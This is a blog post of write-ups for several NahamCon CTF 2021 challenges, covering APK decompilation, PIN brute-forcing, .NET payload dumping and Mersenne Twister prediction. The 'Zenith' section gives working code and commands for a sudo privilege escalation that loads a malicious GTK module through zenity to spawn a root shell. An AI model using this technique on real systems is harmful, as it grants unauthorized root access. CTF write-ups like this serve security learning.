---
layout: post
title:  "Nahamcon CTF 2021 writeups"
date:   2021-03-14 19:59:36 +0200
categories: ctf
---


These are the writeups for[Nahamcon CTF 2021](https://ctf.nahamcon.com/) challenges that I personally solved.

## Buzz

```
gzip -dc buzz
flag{b3a33db7ba04c4c9052ea06d9ff17869}
```

## Resourceful

Decompile [online](https://www.apkdecompilers.com/) and search for the word **flag**:


```java=
((TextView) findViewById(R.id.flagTV)).setText("flag{".concat(getResources().getString(R.string.md5)).concat("}"));
```
The resource is easily found from `strings.xml`:
```xml=
 <string name="md5">7eecc051f5cb3a40cd6bda40de6eeb32</string>
```

## Andra

Decompile [online](https://www.apkdecompilers.com/) and search for the word **flag**:

```xml=
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout
...
android:text="flag{d9f72316dbe7ceab0db10bed1a738482}" android:textAlignment="center" />
    </LinearLayout>
</androidx.constraintlayout.widget.ConstraintLayout>
```

## Microscopium

Decompile [online](https://www.apkdecompilers.com/) and search for the word **flag**:

This time it's hidden in a Javascript function. It's an XOR encryption with a partial key + a user entered pin code:

```javascript=
function b() {
                var t;
                (0, o.default)(this, b);
                for (var n = arguments.length, l = new Array(n), u = 0; u < n; u++) l[u] = arguments[u];
                return (t = v.call.apply(v, [this].concat(l))).state = {
                    output: 'Insert the pin to get the flag',
                    text: ''
                }, t.partKey = "pgJ2K9PMJFHqzMnqEgL", t.cipher64 = "AA9VAhkGBwNWDQcCBwMJB1ZWVlZRVAENW1RSAwAEAVsDVlIAV00=", t.onChangeText = function(n) {
                    t.setState({
                        text: n
                    })
                }, t.onPress = function() {
                    var n = p.Base64.toUint8Array(t.cipher64),
                        o = y.sha256.create();
                    o.update(t.partKey), o.update(t.state.text);
                    for (var l = o.hex(), u = "", c = 0; c < n.length; c++) u += String.fromCharCode(n[c] ^ l.charCodeAt(c));
                    t.setState({
                        output: u
                    })
                }, t
            }
```

Simply brute force the pin codes with some node.js:

```javascript=
function pad(number, length) {
    var str = '' + number;
    while (str.length < length) {
        str = '0' + str;
    }
    return str;
}

var sha256 = require('js-sha256');
var cipher64 = "AA9VAhkGBwNWDQcCBwMJB1ZWVlZRVAENW1RSAwAEAVsDVlIAV00=";
var partKey = "pgJ2K9PMJFHqzMnqEgL";
var toUint8Array = require('base64-to-uint8array');
var n = toUint8Array(cipher64);

for (var i=0 ; i < 10000; i++) {
    let pin = pad(i,4);
    var o = sha256.create();
    o.update(partKey);
    o.update(pin);
    for (var l = o.hex(),u="",c=0;c<n.length;c++) u+= String.fromCharCode(n[c] ^ l.charCodeAt(c));
    if (u.includes("flag{"))
        console.log(u);
}
```


## Alphabet soup

Start by dumping the embedded assembly to a file:
```csharp=
byte[] unfusked = Convert.FromBase64String(zcfZIEShfvKnnsZ(pTIxJTjYJE, YKyumnAOcgLjvK));
System.IO.File.WriteAllBytes("unfucked.exe",unfusked);
```

Use .NET decompiler (I used dotPeek) to decompile the program. Then dump the array to a file:

```csharp=
      Console.WriteLine("Not so fast!");
      System.IO.File.WriteAllBytes("whatnow",numArray);
```

The flag is embedded in the middle of the file.

## Zenith

Since we know the password let's take a look at sudo:

```bash=
sudo -l
[sudo] password for user: 
Matching Defaults entries for user on zenith-0ce4b2b850612747-668869dc99-jp4gs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on zenith-0ce4b2b850612747-668869dc99-jp4gs:
    (root) /usr/bin/zenity
```
Ok, let's look how this could be exploited. From options we notice that additional libraries can be loaded, nice:

```
GTK+ Options
  --class=CLASS                                     Program class as used by the window manager
  --name=NAME                                       Program name as used by the window manager
  --gdk-debug=FLAGS                                 GDK debugging flags to set
  --gdk-no-debug=FLAGS                              GDK debugging flags to unset
  --gtk-module=MODULES                              Load additional GTK+ modules
  --g-fatal-warnings                                Make all warnings fatal
  --gtk-debug=FLAGS                                 GTK+ debugging flags to set
  --gtk-no-debug=FLAGS                              GTK+ debugging flags to unset
```

Let's make a evil library:

```c=
#include <iostream>
#include <gtk/gtk.h>
#include <stdlib.h>

extern "C" {
void gtk_module_init(gint *argc, gchar ***argv[]) {
    system("/bin/sh");
}
}
```

and compile:
```
g++ -fPIC -shared -Wl,-soname,libfoo.so.1 -olibfoo.so.1.0.1 `pkg-config --libs --cflags gtk+-3.0` evilgtk.c
```

and execute it:

```
sudo /usr/bin/zenity --gtk-module=/tmp/libfoo.so.1.0.1 --info --txt "pwnd"
```

note that to get display configured properly use `-X` option when you ssh into the box.

Get the flag:

```
# cd /root
# chmod a+x get_flag
# ./get_flag
flag{d1fbeab9101e0ee7fc1342e4c96b4603}
```

## Dice roll

The randomness is based on *Mersenne Twister* which is not cryptographically secure. Use https://github.com/tna0y/Python-random-module-cracker to predict the next roll:

```python=
import random, time
from randcrack import RandCrack
from pwn import *

rc = RandCrack()

r = remote('challenge.nahamcon.com', 31784)
r.recvuntil('>')

for i in range(624):
    r.send('2\n')
    r.recvline() #rolling
    result = int(r.recvline())
    rc.submit(result)
    print("i:"+str(i)+", :"+str(result))
    r.recvuntil('>')

print("Guessing the number is {}".format(rc.predict_randrange(0,4294967295)))
r.interactive()
```

